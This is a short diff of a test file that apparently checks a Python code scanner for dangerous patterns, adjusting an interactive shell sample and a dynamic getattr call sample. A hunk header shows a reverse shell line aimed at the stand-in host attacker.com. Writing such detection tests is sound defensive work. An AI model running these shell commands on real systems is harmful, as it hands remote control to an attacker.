@@ -100,7 +100,7 @@ os.system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
 		{
 			name: "interactive shell",
 			code: `
-subprocess.call(["/bin/bash", "-i"])
+os.system("/bin/bash -i")
 `,
 			wantFindings: true,
 			minFindings:  1,
@@ -223,8 +223,7 @@ exec(code_obj)
 		{
 			name: "getattr with call",
 			code: `
-func = getattr(module, method_name)
-func()
+getattr(module, method_name)()
 `,
 			wantFindings: true,
 			minFindings:  1,
